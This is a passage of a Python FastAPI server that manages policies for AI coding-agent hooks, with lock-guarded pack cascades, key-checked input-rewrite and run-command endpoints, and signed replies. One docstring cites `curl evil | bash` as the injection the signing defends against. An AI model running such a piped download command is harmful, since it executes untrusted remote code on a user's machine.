                target: PolicyOverride | None = None
                for ov in existing:
                    if ov.policy.id == member_id:
                        target = ov
                        break
                if target is not None and target.enabled:
                    return {"id": member_id, "enabled": True, "ok": True}
                if target is None:
                    _assert_policy_lifecycle_endorsed(inline)
                    saved_enforcement = _resolve_enforcement_for(inline)
                    existing.append(PolicyOverride(
                        policy=inline,
                        source="bot",
                        enabled=True,
                        enforcement=saved_enforcement,
                    ))
                else:
                    saved_enforcement = _revalidate_for_reenable(target)
                    _assert_policy_lifecycle_endorsed(target.policy)
                    existing = [
                        ov for ov in existing if ov.policy.id != member_id
                    ]
                    existing.append(PolicyOverride(
                        policy=target.policy,
                        source=target.source,
                        enabled=True,
                        enforcement=saved_enforcement,
                    ))
                store.save(existing)
                return {"id": member_id, "enabled": True, "ok": True}
            except HTTPException as e:
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": e.detail}
            except Exception as e:  # noqa: BLE001
                return {"id": member_id, "enabled": False, "ok": False,
                        "error": str(e)}
        # User-policy member.
        try:
            existing = store.load()
            target = None
            for ov in existing:
                if ov.policy.id == member_id:
                    target = ov
                    break
            if target is None:
                return {
                    "id": member_id, "enabled": False, "ok": False,
                    "error": "member policy not found in store",
                }
            if target.enabled:
                return {"id": member_id, "enabled": True, "ok": True}
            saved_enforcement = _revalidate_for_reenable(target)
            _assert_policy_lifecycle_endorsed(target.policy)
            new_list = [
                ov for ov in existing if ov.policy.id != member_id
            ]
            new_list.append(PolicyOverride(
                policy=target.policy,
                source=target.source,
                enabled=True,
                enforcement=saved_enforcement,
            ))
            store.save(new_list)
            return {"id": member_id, "enabled": True, "ok": True}
        except HTTPException as e:
            return {"id": member_id, "enabled": False, "ok": False,
                    "error": e.detail}
        except Exception as e:  # noqa: BLE001
            return {"id": member_id, "enabled": False, "ok": False,
                    "error": str(e)}

    def _disable_one_member_locked(member_id: str) -> dict:
        """Lock-held inner work to disable a single member. See
        _enable_one_member_locked for why this is split."""
        # Prebuilt member.
        if member_id.startswith("prebuilt/"):
            slug = member_id[len("prebuilt/"):]
            try:
                _disable_prebuilt_locked(slug)
                return {"id": member_id, "enabled": False, "ok": True}
            except HTTPException as e:
                return {"id": member_id, "enabled": True, "ok": False,
                        "error": e.detail}
            except Exception as e:  # noqa: BLE001
                return {"id": member_id, "enabled": True, "ok": False,
                        "error": str(e)}
        # Inline + user-policy members share the same disable shape:
        # flip the row's enabled flag to False if present, no-op
        # otherwise.
        try:
            existing = store.load()
            changed = False
            new_list: list[PolicyOverride] = []
            for ov in existing:
                if ov.policy.id == member_id and ov.enabled:
                    new_list.append(PolicyOverride(
                        policy=ov.policy,
                        source=ov.source,
                        enabled=False,
                        enforcement=ov.enforcement,
                    ))
                    changed = True
                else:
                    new_list.append(ov)
            if changed:
                store.save(new_list)
            return {"id": member_id, "enabled": False, "ok": True}
        except HTTPException as e:
            return {"id": member_id, "enabled": True, "ok": False,
                    "error": e.detail}
        except Exception as e:  # noqa: BLE001
            return {"id": member_id, "enabled": True, "ok": False,
                    "error": str(e)}

    async def _cascade(
        pack_id: str, action: str, *, only_missing: bool = False,
    ) -> dict:
        """Run an enable / disable / enable-missing cascade over every
        member of `pack_id`.

        Fix follow-up (concurrency): hold `policy_lock` for the entire
        member loop AND for the post-cascade status recompute. Before
        this change each member call took the lock independently, so a
        concurrent admin request (single-policy toggle, sibling pack
        cascade, PATCH /policies/{id}/enabled) could interleave between
        two members of the same cascade — the `only_missing` snapshot
        would drift mid-loop and the post-cascade `status` could
        publish a state that did not match the operator's intent. The
        prebuilt enable/disable routes still acquire the lock at the
        request boundary; the cascade reuses `_enable_prebuilt_locked`
        / `_disable_prebuilt_locked` so we never nest the
        non-reentrant asyncio.Lock.

        Blunt-cascade semantics (every member is flipped to the target
        regardless of cross-pack ownership) are unchanged. The
        membership-conflict invariant is pinned by
        `test_blunt_cascade_overrides_shared_member`.
        """
        members = _resolve_pack_members(pack_id)
        if members is None:
            raise HTTPException(404, f"pack {pack_id!r} not found")
        results: list[dict] = []
        async with policy_lock:
            if action == "enable":
                # Snapshot is taken inside the lock so it cannot drift.
                if only_missing:
                    enabled_now = {ov.policy.id for ov in store.load()
                                    if ov.enabled}
                else:
                    enabled_now = set()
                for mid in members:
                    if only_missing and mid in enabled_now:
                        results.append({
                            "id": mid, "enabled": True, "ok": True,
                            "skipped": True,
                        })
                        continue
                    results.append(_enable_one_member_locked(mid, pack_id))
            else:
                for mid in members:
                    results.append(_disable_one_member_locked(mid))
            # Recompute status post-attempt INSIDE the lock so the
            # status read sees the cascade's own writes and nothing
            # else.
            from ...policy.pack import compute_status
            enabled_after = {ov.policy.id for ov in store.load()
                              if ov.enabled}
        status, enabled_count = compute_status(members, enabled_after)
        return {
            "id": pack_id,
            "status": status,
            "enabled_count": enabled_count,
            "member_count": len(members),
            "results": results,
        }

    @app.post("/policy-packs/{pack_id:path}/enable",
              dependencies=[Depends(require_admin_key)])
    async def enable_policy_pack(pack_id: str) -> dict:
        return await _cascade(pack_id, "enable", only_missing=False)

    @app.post("/policy-packs/{pack_id:path}/enable-missing",
              dependencies=[Depends(require_admin_key)])
    async def enable_missing_policy_pack(pack_id: str) -> dict:
        return await _cascade(pack_id, "enable", only_missing=True)

    @app.post("/policy-packs/{pack_id:path}/disable",
              dependencies=[Depends(require_admin_key)])
    async def disable_policy_pack(pack_id: str) -> dict:
        return await _cascade(pack_id, "disable")

    # D57f-2 — input-rewrite verdict endpoint. Called by the
    # `magi-cp-input-rewrite` shim at PreToolUse time. Routed BEFORE
    # the `/policies/{policy_id:path}` catch-all so the literal
    # `input_rewrite` segment is not parsed as a policy id.
    #
    # P1 follow-up: optional `X-Api-Key` gating. The original D57f-2
    # justification (parallel to `/pubkey`) doesn't survive scrutiny:
    # `/pubkey` returns a constant public artifact, while this route
    # accepts attacker-supplied (policy_id, tool_name, tool_input) and
    # leaks `rewrote: true/false` plus the mutated dict — a remote
    # oracle on policy id existence + rewriter semantics. When the
    # operator has set `MAGI_CP_API_KEY` (the same env the shim
    # forwards on every call after the heartbeat path was wired), the
    # endpoint requires it; absent the env (loopback dev loop with no
    # tenant credential), the endpoint remains open so the dev path
    # the original justification described still works. The shim's
    # forwarding lives at gate.input_rewrite_cli — see the X-Api-Key
    # header construction there.
    @app.post("/policies/input_rewrite")
    async def policies_input_rewrite(
        req: InputRewriteReq,
        x_api_key: str | None = Header(default=None),
    ) -> dict:
        """Apply an `InputRewritePolicy` to a PreToolUse payload.

        The shim sends the policy id + tool_name + raw tool_input dict;
        the cloud looks up the policy, checks the matcher against the
        tool_name (defense in depth — CC's hook matcher already filtered
        before the shim ran, but a stale managed-settings could deliver
        the wrong policy id), runs the bounded rewriter, and returns the
        new tool_input dict.

        Soft failure modes (every one returns `{"rewrote": false}`):
          - policy not found / disabled
          - policy is not an `InputRewritePolicy`
          - matcher does not cover `tool_name`
          - rewriter is a no-op against the payload

        Auth: fail-closed. `MAGI_CP_API_KEY` unset -> 503 (not configured),
        present + mismatch -> 401. The shipped image always sets the key
        (compose `${VAR:?}`); the previous "only enforce if the env is set"
        was a fail-OPEN default that surfaced the rewrite on a misconfigured
        deployment (API-3). The shim forwards the same key from its env.
        """
        _check_key("MAGI_CP_API_KEY", x_api_key)

        target_id = req.policy_id
        match: AnyPolicy | None = None
        match_enabled = False
        for ov in store.load():
            if ov.policy.id != target_id:
                continue
            match = ov.policy
            match_enabled = ov.enabled
            break
        if match is None or not match_enabled:
            return {"rewrote": False}
        if not isinstance(match, InputRewritePolicy):
            return {"rewrote": False}
        # Matcher coverage: defer to the single matrix.py predicate so
        # the runtime check stays in lock-step with the matcher
        # classifier the authoring-time validators use. Defensive
        # wildcard refusal stays explicit because a wildcard rewriter
        # row in the store is a corrupted state — authoring rejects
        # it, but a downgrade attack on the on-disk schema could land
        # one and we want a visible refusal lane rather than silently
        # rewriting every tool's input field of the same name.
        matcher = match.trigger.matcher
        if matcher == "*":
            return {"rewrote": False}
        if not matcher_covers(matcher, req.tool_name):
            return {"rewrote": False}
        try:
            new_input = apply_rewriter(match.rewriter, req.tool_input)
        except Exception:
            return {"rewrote": False}
        if new_input == req.tool_input:
            return {"rewrote": False}
        return {"rewrote": True, "updated_input": new_input}

    # D63 — resolution endpoint for the `magi-cp-run-command` shim.
    # The shim hits this route with the policy id; the cloud looks up
    # the RunCommandPolicy and returns the spec (runtime / inline
    # command body / attached script path / args / timeout / fail_closed).
    # The shim then executes it locally and prints whatever the
    # command emitted as the CC hookSpecificOutput JSON.
    #
    # Defense in depth on the multi-tenant lane: `_run_command_allowed`
    # gates this route too. The hosted image runs with
    # `MAGI_CP_ALLOW_RUN_COMMAND=0` so even if a leaked managed-settings
    # carries a run-command hook entry, the cloud refuses to surface
    # the spec.
    @app.post("/policies/run_command")
    async def policies_run_command(
        req: RunCommandReq,
        x_api_key: str | None = Header(default=None),
    ) -> dict:
        """Look up a RunCommandPolicy and return the resolved spec.

        D63 review (P1 trust-on-loopback): the reply is Ed25519-signed
        with the same cloud key the WAL token path uses, so the shim
        can verify a man-in-the-middle on the loopback / sidecar bind
        cannot inject `command='curl evil | bash'`. The unsigned
        compatibility shape stays available when the keystore isn't
        wired (the in-process test app builds without one), but the
        installed self-host image always carries a keystore so the
        shim's verification is the operative path.

        Auth: mirror the rest of the data plane —
        ``MAGI_CP_API_KEY`` is REQUIRED on this route. The brief's
        ad-hoc "only if env is set" behavior inverted the fail-closed
        default and is now retired. The dev loop sets the env
        explicitly; tests pass the same header the WAL flush uses.

        Soft failure (`{"matched": false}`):
          - run_command surface disabled on this deployment
          - policy not found / disabled
          - policy is not a RunCommandPolicy
        """
        # Fail-closed, now matching the docstring: unset MAGI_CP_API_KEY -> 503,
        # mismatch -> 401. The previous "only if env is set" was fail-OPEN, and
        # the removed "refuse non-loopback callers" comment described a check
        # that was never implemented (there is no request object here). The
        # real trust boundary is this key check plus MAGI_CP_ALLOW_RUN_COMMAND=0.
        _check_key("MAGI_CP_API_KEY", x_api_key)
        if not _run_command_allowed():
            return {"matched": False, "reason": "disabled"}
        target_id = req.policy_id
        match: AnyPolicy | None = None
        match_enabled = False
        for ov in store.load():
            if ov.policy.id != target_id:
                continue
            match = ov.policy
            match_enabled = ov.enabled
            break
        if match is None or not match_enabled:
            return {"matched": False, "reason": "not_found"}
        if not isinstance(match, RunCommandPolicy):
            return {"matched": False, "reason": "wrong_type"}
        # When the policy uses an attached script, resolve to the body
        # path on the cloud's local disk (the shim is co-located on the
        # same host in the self-host docker compose image).
        #
        # P2 (script-store-resolver consistency): use the closure-
        # captured `script_store` so a test that monkeypatches
        # `MAGI_CP_SCRIPT_STORE_DIR` after create_app sees the same
        # bodies the /scripts POST path persists to. The previous
        # path rebuilt ScriptStore from env at every request and would
        # silently drift.
        spec_body: dict = {
            "runtime": match.runtime,
            "command": match.command,
            "script_path": "",
            "args": list(match.args),
            "timeout_ms": match.timeout_ms,
            "fail_closed": match.fail_closed,
            # working_dir: per-policy scratch dir under
            # ~/.magi-cp/local/run_command/<id>/. None means "let the
            # shim resolve it locally" (the shim has the same default).
            "working_dir": None,
        }
        if match.script_path:
            # P2 (script-store-resolver consistency): closure-captured
            # store first; fall back to env-construction only when the
            # caller didn't wire one (legacy create_app call sites and
            # the standalone test harness).
            local_store: ScriptStore
            if script_store is not None:
                local_store = script_store
            else:  # pragma: no cover — exercised by legacy callers only
                script_dir = os.environ.get(
                    "MAGI_CP_SCRIPT_STORE_DIR",
                    str(Path.home() / ".magi-cp"),
                )
                local_store = ScriptStore(dir=script_dir)
            body_path = local_store.body_path(match.script_path)
            if body_path is None:
                return {"matched": False, "reason": "script_missing"}
            spec_body["script_path"] = body_path
        reply: dict = {"matched": True, "spec": spec_body}
        # P1 (sign-reply): wrap the spec in a short-TTL Ed25519 token
        # so the shim can detect a tampered reply on loopback / a
        # misbound cloud port. The shim already verifies the cloud's
        # pubkey via `_load_pubkey_for_kid`; same trust anchor as the
        # WAL evidence path.
        if keystore is not None:
            now = int(time.time())
            token_body = {
                "kind": "run_command_spec",
                "policy_id": target_id,
                "spec": spec_body,
                "iat": now,
                # Short TTL: the shim re-fetches per gate fire.
                "exp": now + 60,
                "kid": kid,
            }
            try:
                token = sign_token(token_body, keystore.load_private())
                reply["signed"] = token
                reply["kid"] = kid
            except Exception:  # pragma: no cover — keystore unreachable
                # Don't break the legacy unsigned reply path.
                pass
        return reply

    # Order matters: more specific (/compiled, /enabled) before the catch-all
    # {policy_id:path} so FastAPI matches them first.
    @app.get("/policies/{policy_id:path}/compiled",
             dependencies=[Depends(require_admin_key)])
    def get_compiled(policy_id: str) -> dict:
        for ov in store.load():
            if ov.policy.id == policy_id:
                ms, sha = _compile_with_sha(ov.policy)
                return {"managed_settings": ms, "sha256": sha}
        raise HTTPException(404, f"policy {policy_id!r} not found")

    # D77 — synthetic CC hook payload simulator. Given a saved policy
    # and an operator-authored synthetic hook payload, predicts the
    # verdict + action + hookSpecificOutput the runtime would emit
    # WITHOUT running CC, spawning a subprocess, or mutating state.
    #
    # Reuses `policy.test_runner.test_policy` (the source of truth)
    # so the answer is structurally identical to what the runtime gate
    # would produce. The endpoint is admin-key gated (same surface as
    # the dry-run / compile authoring endpoints) because it returns
    # the literal command body for RunCommandPolicy and the template
    # body for ContextInjectionPolicy — both sensitive enough to keep
    # off the public tenant key.
    @app.post("/policies/{policy_id:path}/test",
              dependencies=[Depends(require_admin_key)])
    async def test_one_policy(policy_id: str, body: dict = Body(...)) -> dict:
        from ...policy.test_runner import result_to_dict, test_policy
        if not isinstance(body, dict):
            raise HTTPException(422, "body must be a JSON object")
        payload = body.get("payload")
        if not isinstance(payload, dict):
            raise HTTPException(422, "payload must be a JSON object")
        event = body.get("event")
        if event is not None and not isinstance(event, str):
            raise HTTPException(422, "event must be a string")
        target: PolicyOverride | None = None
        for ov in store.load():
            if ov.policy.id == policy_id:
                target = ov
                break
        if target is None:
            raise HTTPException(404, f"policy {policy_id!r} not found")
        try:
            result = test_policy(
                target.policy, payload, event=event or "",
            )
        except (ValueError, KeyError) as e:
            raise HTTPException(422, str(e)) from e
        envelope = result_to_dict(result)
        envelope["policy_id"] = policy_id
        envelope["policy_type"] = getattr(
            target.policy, "type", "evidence",
        )
        return envelope

    @app.post("/policy-packs/{pack_id:path}/test",
              dependencies=[Depends(require_admin_key)])
    async def test_one_pack(pack_id: str, body: dict = Body(...)) -> dict:
        """D77 — multi-policy simulator. Runs the same synthetic
        payload through every member of a pack and returns a per-member
        result. Built-in + user packs are both supported via
        `_resolve_pack_members` (defined alongside the pack routes
        above so member resolution stays consistent).
        """
        from ...policy.test_runner import result_to_dict, test_policy
        # P2 fix: mirror the get_policy_pack prefix guard so a typo'd
        # / hostile pack_id doesn't catch the path-typed match and
        # echo the operator-supplied id back through the 404 string.
        if not pack_id.startswith("pack/") and not pack_id.startswith(
            "user-pack/"
        ):
            raise HTTPException(404, f"pack {pack_id!r} not found")
        if not isinstance(body, dict):
            raise HTTPException(422, "body must be a JSON object")
        payload = body.get("payload")
        if not isinstance(payload, dict):
            raise HTTPException(422, "payload must be a JSON object")
        event = body.get("event")
        if event is not None and not isinstance(event, str):
            raise HTTPException(422, "event must be a string")
        member_ids = _resolve_pack_members(pack_id)
        if member_ids is None:
            raise HTTPException(404, f"pack {pack_id!r} not found")
        existing_by_id = {ov.policy.id: ov for ov in store.load()}
        # Pre-resolve inline pack-owned IRs (strict-block bundle) so
        # un-materialized members still simulate. inline_policy_for
        # returns None for members that are user-defined / prebuilt
        # (those are looked up via existing_by_id).
        from ...policy.pack import inline_policy_for
        from ...policy.prebuilt import build_prebuilt_evidence_policy
        members_out: list[dict] = []
        for mid in member_ids:
            ov = existing_by_id.get(mid)
            policy_obj: AnyPolicy | None = ov.policy if ov is not None else None
            if policy_obj is None:
                inline = inline_policy_for(pack_id, mid)
                if inline is not None:
                    policy_obj = inline
            if policy_obj is None and mid.startswith("prebuilt/"):
                try:
                    policy_obj = build_prebuilt_evidence_policy(mid)
                except Exception:  # noqa: BLE001
                    policy_obj = None
            if policy_obj is None:
                members_out.append({
                    "policy_id": mid,
                    "skipped_reason": "member-not-resolvable",
                    "verdict": "skipped",
                    "action": "skipped",
                    "evidence_match_reasons": [
                        f"pack member {mid!r} is not yet materialized "
                        "in the policy store; enable the pack or the "
                        "individual member to test it",
                    ],
                    "hook_specific_output": {},
                    "requires_results": [],
                })
                continue
            try:
                result = test_policy(
                    policy_obj, payload, event=event or "",
                )
            except (ValueError, KeyError) as e:
                members_out.append({
                    "policy_id": mid,
                    "skipped_reason": "evaluation-error",
                    "verdict": "skipped",
                    "action": "skipped",
                    "evidence_match_reasons": [str(e)],
                    "hook_specific_output": {},
                    "requires_results": [],
                })
                continue
            envelope = result_to_dict(result)
            envelope["policy_id"] = mid
            envelope["policy_type"] = getattr(
                policy_obj, "type", "evidence",
            )
            members_out.append(envelope)
        return {
            "pack_id": pack_id,
            "members": members_out,
            "member_count": len(member_ids),
        }


    # ── pack -> policy -> rule: the policy tier ──────────────────────
    # A 'policy' is the user-facing unit (one authored intent); it owns one or
    # more 'rules' (the IR policies above). Ownership is PolicyRecord.rule_ids;
    # the compiler/resolve pipeline stays rule-based. Routed BEFORE the
    # /policies/{id:path} catch-all so these literal paths win.
    def _members_from_draft(draft: dict) -> list[dict]:
        from ...policy.compound import expand_compound_draft, is_compound_draft
        if is_compound_draft(draft):
            return expand_compound_draft(draft)
        return [draft]

    @app.post("/policies/compound", dependencies=[Depends(require_admin_key)])
    async def post_compound(body: CompoundPolicyReq) -> dict:
        """Author a policy that owns one or more rules. Expand -> validate all
        (atomic) -> write PolicyRecord + upsert member rules + drop rules the
        policy previously owned but no longer does (re-save diff)."""
        if policy_group_store is None:
            raise HTTPException(500, "policy group store not configured")
        draft = body.draft
        policy_id = str(draft.get("id") or "").strip()
        if not policy_id:
            raise HTTPException(400, "policy draft needs an id")
        if any(policy_id.endswith(s) for s in _RESERVED_ID_SUFFIXES):
            raise HTTPException(400, f"policy id must not end in {_RESERVED_ID_SUFFIXES}")
        try:
            _validate_id(policy_id)
        except ValueError as e:
            raise HTTPException(400, f"policy id: {e}")
        try:
            members_raw = _members_from_draft(draft)
        except ValueError as e:
            raise HTTPException(400, str(e))
        rules = []
        for raw in members_raw:
            rid = raw.get("id")
            if any(str(rid).endswith(s) for s in _RESERVED_ID_SUFFIXES):
                raise HTTPException(400, f"rule id must not end in {_RESERVED_ID_SUFFIXES}")
            try:
                rules.append(_deserialize_policy_from_api(raw))
            except (ValueError, KeyError) as e:
                raise HTTPException(400, f"rule {rid!r}: {e}")
        new_rule_ids = [p.id for p in rules]
        # P1-1: every member rule goes through the SAME authoring gates a PUT
        # would enforce (run_command gating, script resolvability, verifier-step
        # resolution + lifecycle endorsement). No validation bypass.
        enforcement: dict[str, str] = {}
        for p in rules:
            enforcement[p.id] = await _validate_and_stamp(p)

        from ...policy.compound import is_compound_draft
        record = PolicyRecord(
            id=policy_id,
            description=str(draft.get("description") or ""),
            kind="compound" if is_compound_draft(draft) else "simple",
            draft=draft, rule_ids=new_rule_ids,
            source=body.source, enabled=body.enabled,
        )
        async with policy_lock:
            # P1-3: a member rule id must not already be owned by a DIFFERENT
            # policy (else a re-save would silently steal it, and a cascade
            # delete would strand the other record's rule_ids).
            for other in policy_group_store.load():
                if other.id == policy_id:
                    continue
                clash = set(new_rule_ids) & set(other.rule_ids)
                if clash:
                    raise HTTPException(
                        409, f"rule id(s) {sorted(clash)} already owned by "
                        f"policy {other.id!r}")
            prev = policy_group_store.get(policy_id)
            stale = set(prev.rule_ids) - set(new_rule_ids) if prev else set()
            keep = {p.id for p in rules}
            existing = [ov for ov in store.load()
                        if ov.policy.id not in keep and ov.policy.id not in stale]
            for p in rules:
                existing.append(PolicyOverride(
                    policy=p, source=body.source,  # type: ignore[arg-type]
                    enabled=body.enabled, enforcement=enforcement[p.id],
                ))
            # P2-2: write the group record BEFORE the rules so a crash between
            # the two file writes leaves "record without (some) rules" (a
            # retryable re-save reconciles) rather than orphan rules with no
            # owning record.
            groups = [r for r in policy_group_store.load() if r.id != policy_id]
            groups.append(record)
            policy_group_store.save(groups)
            store.save(existing)
        return {"id": policy_id, "kind": record.kind, "rule_ids": new_rule_ids,
                "types": [getattr(p, "type", "evidence") for p in rules],
                "source": body.source, "enabled": body.enabled}

    @app.get("/policies/groups", dependencies=[Depends(require_admin_key)])
    def list_policy_groups() -> dict:
        """Authored policies, grouped. Free-standing legacy rules not owned by
        any policy surface as one-rule policies (read-time synthesis)."""
        if policy_group_store is None:
            return {"policies": []}
        groups = policy_group_store.load()
        # Rule enabled-state is the source of truth (PATCH /enabled acts on
        # rules); derive the policy's enabled from its members rather than
        # trusting the write-once PolicyRecord.enabled, which would go stale.
        rule_enabled = {ov.policy.id: ov.enabled for ov in store.load()}
        owned: set[str] = set()
        items = []
        for g in groups:
            owned.update(g.rule_ids)
            present = [rid for rid in g.rule_ids if rid in rule_enabled]
            # A policy is enabled iff every present member rule is enabled;
            # "mixed" flags a compound half-toggled out from under the user.
            states = {rule_enabled[rid] for rid in present}
            enabled = bool(present) and states == {True}
            items.append({"id": g.id, "description": g.description, "kind": g.kind,
                          "rule_ids": list(g.rule_ids), "enabled": enabled,
                          "mixed": len(states) > 1,
                          "missing_rules": [rid for rid in g.rule_ids if rid not in rule_enabled],
                          "source": g.source})
        for rid, en in rule_enabled.items():
            if rid not in owned:
                ov = next(o for o in store.load() if o.policy.id == rid)
                items.append({"id": rid, "description": ov.policy.description,
                              "kind": "simple", "rule_ids": [rid],
                              "enabled": en, "mixed": False, "missing_rules": [],
                              "source": ov.source})
        return {"policies": items}

    @app.delete("/policies/groups/{policy_id:path}", dependencies=[Depends(require_admin_key)])
    async def delete_policy_group(policy_id: str) -> dict:
        """Delete an authored policy and all rules it owns (cascade)."""
        if policy_group_store is None:
            raise HTTPException(500, "policy group store not configured")
        async with policy_lock:
            rec = policy_group_store.get(policy_id)
            if rec is None:
                raise HTTPException(404, f"policy {policy_id!r} not found")
            drop = set(rec.rule_ids)
            store.save([ov for ov in store.load() if ov.policy.id not in drop])
            policy_group_store.save(
                [r for r in policy_group_store.load() if r.id != policy_id])
        return {"deleted": policy_id, "rule_ids": list(rec.rule_ids)}

    @app.patch("/policies/groups/{policy_id:path}/enabled",
               dependencies=[Depends(require_admin_key)])
    async def patch_policy_group_enabled(policy_id: str, body: PatchEnabledReq) -> dict:
        """Enable/disable an authored policy: cascades to every rule it owns.
        The dashboard toggles here (policy granularity), not per rule."""
        if policy_group_store is None:
            raise HTTPException(500, "policy group store not configured")
        rec = policy_group_store.get(policy_id)
        if rec is None:
            raise HTTPException(404, f"policy {policy_id!r} not found")
        async with policy_lock:
            targets = set(rec.rule_ids)
            new_list = [
                PolicyOverride(policy=ov.policy, source=ov.source,
                               enabled=body.enabled if ov.policy.id in targets else ov.enabled,
                               enforcement=ov.enforcement)
                for ov in store.load()
            ]
            store.save(new_list)
            groups = policy_group_store.load()
            for i, r in enumerate(groups):
                if r.id == policy_id:
                    r.enabled = body.enabled
                    groups[i] = r
                    break
            policy_group_store.save(groups)
        return {"id": policy_id, "enabled": body.enabled, "rule_ids": list(rec.rule_ids)}

    @app.get("/policies/{policy_id:path}", dependencies=[Depends(require_admin_key)])
    def get_policy(policy_id: str) -> dict:
        for ov in store.load():
            if ov.policy.id == policy_id:
                _, sha = _compile_with_sha(ov.policy)
                # P8 follow-up: re-validate legacy unstamped rows on
                # read instead of silently falling back to the legacy
                # (action, event) label.
                enf, _eff_enabled = _resolve_legacy_unstamped(ov)
                return {
                    "id": ov.policy.id,
                    "source": ov.source,
                    "enabled": ov.enabled,
                    "policy": _serialize_policy_for_api(ov.policy),
                    "enforcement": enf,
                    "compiled_sha256": sha,
                }
        raise HTTPException(404, f"policy {policy_id!r} not found")

    async def _validate_and_stamp(policy: AnyPolicy) -> str:
        """Run every authoring-time gate on a deserialized rule and return its
        resolved enforcement label. Shared by PUT and the compound save path so
        the two cannot diverge (a member rule saved via /policies/compound gets
        the SAME gates as a rule PUT directly). Raises HTTPException on refusal."""
        # D63: run_command disabled on hosted.
        if isinstance(policy, RunCommandPolicy) and not _run_command_allowed():
            raise HTTPException(
                403,
                "run_command policies are disabled on this deployment "
                "(MAGI_CP_ALLOW_RUN_COMMAND=0).",
            )
        # D65 P2: script store-resolvability.
        if (isinstance(policy, RunCommandPolicy) and policy.script_path
                and script_store is not None):
            if script_store_lock is not None:
                async with script_store_lock:
                    resolved = script_store.get(policy.script_path)
            else:
                resolved = script_store.get(policy.script_path)
            if resolved is None:
                raise HTTPException(
                    422, f"script_path {policy.script_path!r} is not in the "
                    "script store; upload it at /scripts first")
        # P8 + D57e: verifier-step resolution + lifecycle endorsement.
        from ...policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        if isinstance(policy, EvidencePolicy):
            try:
                enf = resolve_policy_enforcement(
                    policy, registry=verifier_registry, vendor_catalog_fn=vendor_catalog)
            except StepResolutionError as e:
                raise HTTPException(422, str(e)) from e
            _assert_policy_lifecycle_endorsed(policy)
            if not any(r.kind == "step" for r in policy.requires):
                enf = _enforcement_label(policy)
            return enf
        return _enforcement_label(policy)

    @app.put("/policies/{policy_id:path}", dependencies=[Depends(require_admin_key)])
    async def put_policy(policy_id: str, body: PutPolicyReq) -> dict:
        # Issue #1 P0 (#12): the discriminated-union path. Body is
        # loosely typed at the boundary; archetype-specific shape
        # checks happen in Policy.__post_init__ via policy_from_dict.
        raw = body.policy
        if raw.get("id") != policy_id:
            raise HTTPException(400, "id mismatch between url and body")
        if any(policy_id.endswith(s) for s in _RESERVED_ID_SUFFIXES):
            raise HTTPException(400, f"policy id must not end in {_RESERVED_ID_SUFFIXES}")
        try:
            policy = _deserialize_policy_from_api(raw)
        except (ValueError, KeyError) as e:
            # Matrix violation or any other __post_init__ failure
            raise HTTPException(400, str(e))
        # D63: env-gated refusal for run_command saves on hosted
        # deployments. Default-ON (self-host docker compose carries
        # `MAGI_CP_ALLOW_RUN_COMMAND=1`); the hosted image overrides to
        # "0" to keep the inline command + attached script surface off
        # the multi-tenant fleet. The gate runs at the REST boundary
        # because matrix-coherence already passed by this point and
        # we want a clear 403, not a 400 about "policy save".
        resolved_enforcement = await _validate_and_stamp(policy)
        async with policy_lock:
            existing = store.load()
            existing = [ov for ov in existing if ov.policy.id != policy_id]
            existing.append(PolicyOverride(
                policy=policy, source=body.source,  # type: ignore[arg-type]
                enabled=body.enabled,
                enforcement=resolved_enforcement,
            ))
            store.save(existing)
        # P4: pack membership at authoring time. After the policy write
        # commits, add its id to each selected user-pack's member list.
        # Kept OUTSIDE the policy_lock but INSIDE pack_store_lock so pack
        # membership mutations serialise with the enable/disable cascade
        # + user-pack CRUD handlers that share that lock. Built-in packs
        # are immutable → 400; an unknown id → 404. Idempotent: a policy
        # already in a pack is a no-op for that pack.
        joined_packs: list[str] = []
        requested = body.pack_ids or []
        if requested:
            if pack_store is None or pack_store_lock is None:
                raise HTTPException(500, "pack store not configured")
            # Dedupe request while preserving order so a caller that
            # names the same pack twice does not double-append.
            seen_req: set[str] = set()
            ordered_req: list[str] = []
            for pid in requested:
                if not isinstance(pid, str) or not pid:
                    raise HTTPException(422, "pack_ids entries must be strings")
                if pid.startswith("pack/"):
                    raise HTTPException(
                        400,
                        f"pack {pid!r} has immutable built-in membership; "
                        "select a user pack (or the floor pack) instead",
                    )
                if not pid.startswith("user-pack/"):
                    raise HTTPException(404, f"pack {pid!r} not found")
                if pid in seen_req:
                    continue
                seen_req.add(pid)
                ordered_req.append(pid)
            async with pack_store_lock:
                rows = pack_store.load()
                index = {r.id: i for i, r in enumerate(rows)}
                for pid in ordered_req:
                    idx = index.get(pid)
                    if idx is None:
                        raise HTTPException(404, f"pack {pid!r} not found")
                    cur = rows[idx]
                    members = list(cur.policy_ids)
                    if policy.id not in members:
                        members.append(policy.id)
                    # Preserve is_floor so pinning a policy to the floor
                    # pack does not silently demote it to a normal pack.
                    rows[idx] = UserPackRow(
                        id=cur.id, name=cur.name, description=cur.description,
                        policy_ids=members, is_floor=cur.is_floor,
                    )
                    joined_packs.append(pid)
                pack_store.save(rows)
        return {"id": policy.id, "source": body.source, "enabled": body.enabled,
                "enforcement": resolved_enforcement,
                "type": getattr(policy, "type", "evidence"),
                "pack_ids": joined_packs}

    @app.patch("/policies/{policy_id:path}/enabled",
               dependencies=[Depends(require_admin_key)])
    async def patch_enabled(policy_id: str, body: PatchEnabledReq) -> dict:
        from ...policy.step_enforcement import (
            StepResolutionError, resolve_policy_enforcement,
        )
        async with policy_lock:
            existing = store.load()
            # P1-2: a rule owned by a policy must not be toggled in isolation
            # (half-toggling a compound degrades or un-enforces it). Expand the
            # target to the owning policy's whole rule set so both entry points
            # (rule-level here, and the policy-level route below) keep the
            # invariant. A free-standing rule toggles just itself.
            target_ids = {policy_id}
            owning = None
            if policy_group_store is not None:
                for rec in policy_group_store.load():
                    if policy_id in rec.rule_ids:
                        owning = rec
                        target_ids = set(rec.rule_ids)
                        break
            found = False
            new_list: list[PolicyOverride] = []
            for ov in existing:
                if ov.policy.id in target_ids:
                    found = True
                    new_enforcement = ov.enforcement
                    # P8 follow-up (fix-cycle #4): re-validate against
                    # the live registry whenever the operator is
                    # re-arming the row. A row stamped months ago
                    # against a verifier that was since decommissioned
                    # must not silently round-trip a stale
                    # "enforcing" label on every toggle.
                    if (
                        body.enabled
                        and isinstance(ov.policy, EvidencePolicy)
                        and any(r.kind == "step" for r in ov.policy.requires)
                    ):
                        try:
                            new_enforcement = resolve_policy_enforcement(
                                ov.policy,
                                registry=verifier_registry,
                                vendor_catalog_fn=vendor_catalog,
                            )
                        except StepResolutionError as e:
